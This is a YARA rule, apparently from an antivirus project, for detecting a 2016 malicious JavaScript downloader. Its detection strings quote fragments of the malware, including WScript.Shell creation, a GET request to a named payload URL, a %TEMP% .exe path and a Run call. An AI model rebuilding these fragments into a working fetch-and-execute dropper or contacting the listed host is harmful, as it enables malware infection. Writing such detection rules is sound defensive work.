rule sig_20160328_c8ff13c7fb6f52cf5f0a2ae6704bf9a0 {
  meta:
    description = "datamaliciousorder - file 20160328_c8ff13c7fb6f52cf5f0a2ae6704bf9a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bf0e9539c7028913b9fd07a228f2ddf694f7dad200490a6340791275c8ba0195"

  strings:
    $s1  = "function Zhsnrnkyx() {return Msdpgwgtoi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"uM90JaWZ.exe\";};" fullword ascii
    $s2  = "do {WScript[Zkkay](Iqjgdrskm() * 11)} while (Bdyid[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Msdpgwgtoi = function Csfmssotc() {return WScript[Izfjaw](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Bdyid[Eyroo](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s5  = "function Tzdtdwk(Tczbcdgtrs, Hyspcksl){return Tczbcdgtrs - Hyspcksl;};" fullword ascii
    $s6  = "function Vumnhvk(Pjqqece){Msdpgwgtoi[\"Run\"](Pjqqece, Exnhfjjvt, Exnhfjjvt);};" fullword ascii
    $s7  = "function Whhutyt() {return ((Irrcjvvum == true) && (Irrcjvvum == Ueiiobbhgv)) ? 1 : Exnhfjjvt;};" fullword ascii
    $s8  = "function Iqjgdrskm(){return 22;};" fullword ascii
    $s9  = "function Jokxoqe(){return Hoywtqbgh;};" fullword ascii
    $s10 = "return Tzdtdwk(Ooluvvoogd, Kaukjsdqqh);" fullword ascii
    $s11 = "var Irrcjvvum = false;" fullword ascii
    $s12 = "var Ueiiobbhgv = false;" fullword ascii
    $s13 = "var Jdrsfcgaz = new this[\"Date\"]();" fullword ascii
    $s14 = "function Strptfredm(Dpqfglkxud) {var Oawkiqnvt = (1, 2, 3, 4, 5, Dpqfglkxud); return Oawkiqnvt;};" fullword ascii
    $s15 = "var Lwshwgvyh = false;" fullword ascii
    $s16 = " while (Ekfgb){" fullword ascii
    $s17 = "Ueiiobbhgv = true; " fullword ascii
    $s18 = "Irrcjvvum = true; " fullword ascii
    $s19 = "function Jdadksbbp(){return Izfjaw;};" fullword ascii
    $s20 = "function Dugtcakt()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}